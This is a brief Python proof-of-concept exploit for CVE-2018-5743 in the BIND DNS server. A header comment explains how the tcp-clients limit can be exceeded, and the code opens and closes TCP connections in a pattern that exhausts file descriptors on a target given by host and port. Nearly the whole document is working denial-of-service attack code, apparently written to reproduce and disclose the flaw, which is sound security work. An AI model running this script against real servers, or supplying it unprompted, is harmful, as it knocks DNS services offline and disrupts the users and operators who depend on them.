#!/usr/bin/python
#
# BIND ignoring tcp-clients directive might lead to resources (file descriptors) exhaustion
#
# Under specific conditions tcp-clients limit might be exceeded indefinitely.
# To reproduce set up named with tcp-clients set to e.g. 30, and then
# launch ./CVE-2018-5743.py server_ip server_port.
# It opens and closes TCP connections in a specific pattern, getting over
# tcp-clients limit.

import socket
import sys


host, port = None, None
try:
    host, port = sys.argv[1], int(sys.argv[2])
except:
    print "Usage: %s host port" % sys.argv[0]
    sys.exit(1)


def conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.1)
    try:
        s.connect((host, port))
    except:
        s.close()
        raise
    return s


conns = []
for i in range(100000):
    try:
        newconn = conn()
        conns.append(newconn)
    except socket.timeout:
        c, conns = conns[0], conns[1:]
        c.close()
for c in conns:
    c.close()
